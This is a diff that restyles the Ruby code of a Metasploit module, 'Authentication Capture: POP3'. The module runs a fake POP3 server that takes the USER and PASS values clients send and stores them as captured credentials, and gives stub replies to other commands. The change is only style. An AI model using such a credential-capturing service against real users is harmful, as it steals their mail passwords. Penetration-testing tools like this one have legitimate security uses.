@@ -1,25 +1,22 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 require 'msf/core'
 
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::TcpServer
   include Msf::Auxiliary::Report
 
-
   def initialize
     super(
-      'Name'        => 'Authentication Capture: POP3',
-      'Description'    => %q{
+      'Name' => 'Authentication Capture: POP3',
+      'Description' => %q(
         This module provides a fake POP3 service that
       is designed to capture authentication credentials.
-      },
+      ),
       'Author'      => ['ddz', 'hdm'],
       'License'     => MSF_LICENSE,
       'Actions'     =>
@@ -35,8 +32,9 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
-        OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 110 ])
-      ], self.class)
+        OptPort.new('SRVPORT', [ true, "The local port to listen on.", 110 ])
+      ], self.class
+    )
   end
 
   def setup
@@ -48,11 +46,11 @@ class MetasploitModule < Msf::Auxiliary
     @myhost = datastore['SRVHOST']
     @myport = datastore['SRVPORT']
     print_status("Listening on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}...")
-    exploit()
+    exploit
   end
 
   def on_client_connect(c)
-    @state[c] = {:name => "#{c.peerhost}:#{c.peerport}", :ip => c.peerhost, :port => c.peerport, :user => nil, :pass => nil}
+    @state[c] = { name: "#{c.peerhost}:#{c.peerport}", ip: c.peerhost, port: c.peerport, user: nil, pass: nil }
     c.put "+OK\r\n"
   end
 
@@ -84,17 +82,17 @@ class MetasploitModule < Msf::Auxiliary
 
   def on_client_data(c)
     data = c.get_once
-    return if not data
-    cmd,arg = data.strip.split(/\s+/, 2)
+    return unless data
+    cmd, arg = data.strip.split(/\s+/, 2)
     arg ||= ""
 
-    if(cmd.upcase == "USER")
+    if cmd.casecmp("USER").zero?
       @state[c][:user] = arg
       c.put "+OK\r\n"
       return
     end
 
-    if(cmd.upcase == "PASS")
+    if cmd.casecmp("PASS").zero?
       @state[c][:pass] = arg
 
       report_cred(
@@ -111,22 +109,22 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    if(cmd.upcase == "STAT")
+    if cmd.casecmp("STAT").zero?
       c.put "+OK 0 0\r\n"
       return
     end
 
-    if(cmd.upcase == "CAPA")
+    if cmd.casecmp("CAPA").zero?
       c.put "-ERR No Extended Capabilities\r\n"
       return
     end
 
-    if(cmd.upcase == "LIST")
+    if cmd.casecmp("LIST").zero?
       c.put "+OK 0 Messages\r\n"
       return
     end
 
-    if(cmd.upcase == "QUIT" || cmd.upcase == "RSET" || cmd.upcase == "DELE")
+    if cmd.casecmp("QUIT").zero? || cmd.casecmp("RSET").zero? || cmd.casecmp("DELE").zero?
       c.put "+OK\r\n"
       return
     end
@@ -138,6 +136,4 @@ class MetasploitModule < Msf::Auxiliary
   def on_client_close(c)
     @state.delete(c)
   end
-
-
 end
